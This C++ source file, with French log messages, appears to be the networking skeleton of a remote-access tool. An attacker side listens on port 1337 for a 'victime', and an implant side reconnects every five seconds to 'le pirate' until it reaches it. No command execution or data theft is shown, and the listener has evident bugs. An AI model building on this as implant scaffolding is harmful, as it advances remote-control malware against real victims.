//
// Created by Berlingot on 2023-04-20.
//

#include "Connexion.h"

Connexion::Connexion(const char * adresseIP, unsigned short port, ConnexionType ConnexionTypearg) {
    switch (ConnexionTypearg) {
        case ConnexionType::INBOUND:
            INBOUNDconnexion(adresseIP,port);
            break;
        case ConnexionType::OUTBOUND:
            OUTBOUNDconnexion(adresseIP,port);
            break;
        default:break;
    }
}

void Connexion::INBOUNDconnexion(const char *adresseIP, unsigned short port) {
    if(MyPNet::Network::Initialize()){

        if(socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;
            if (socket.Listen(MyPNet::IPEndpoint("127.0.0.1",1337))==MyPNet::PResult::P_Success){
                std::cout << "Écoute du Socket complété"<<std::endl;
                //new connection
                MyPNet::Socket connectionACible;
                std::cout<<"Lancement de l'écoute pour la connetion d'une victime" << std::endl;

                if (socket.AcceptConnection(socket) == MyPNet::PResult::P_Success){
                    std::cout<<"Victime connecté" << std::endl;


                    }
                }
        }
    }
}
/*
if(MyPNet::Network::Initialize()){

        MyPNet::Socket socket;
        if(socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;
            if (socket.Listen(MyPNet::IPEndpoint("127.0.0.1",1337))==MyPNet::PResult::P_Success){
                std::cout << "Écoute du Socket complété"<<std::endl;
                //new connection
                MyPNet::Socket connectionACible;
                std::cout<<"Lancement de l'écoute pour la connetion d'une victime" << std::endl;

                if (socket.AcceptConnection(connectionACible) == MyPNet::PResult::P_Success){
                    std::cout<<"Victime connecté" << std::endl;

                    std::string buffer = "";
                    uint32_t  a(3), b(2), c(1);
                    MyPNet::Packet packet;
                    while(true){
                        MyPNet::PResult result = connectionACible.ReceivePaquets(packet);
                        if (result != MyPNet::PResult::P_Success){
                            break;
                        }
                        if (!ProcessPacket(packet)){
                            break;
                        }
                    }
                }
            }

            socket.CloseSocket();
        }
    }

    MyPNet::Network::Shutdown(); //ferme l'interface
    return 0;
*/

void Connexion::OUTBOUNDconnexion(const char *adresseIP, unsigned short port) {
    if(MyPNet::Network::Initialize()){
        if(socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;

            std::cout << std::endl<< "Tentative de connexion au pirate"<<std::endl;
            while(pirateTrouvee == false) {
                if (socket.ConnectTo(MyPNet::IPEndpoint(adresseIP, port)) == MyPNet::PResult::P_Success) {
                    pirateTrouvee = true;
                    std::cout << "Connexion établie" << std::endl;
                    return;
                } else { std::cout << std::endl << "Tentative de connexion échoué." << std::endl << "Nouvelle tentative dans 5 secondes" << std::endl; sleep(5);}
            }
        }
    }
}


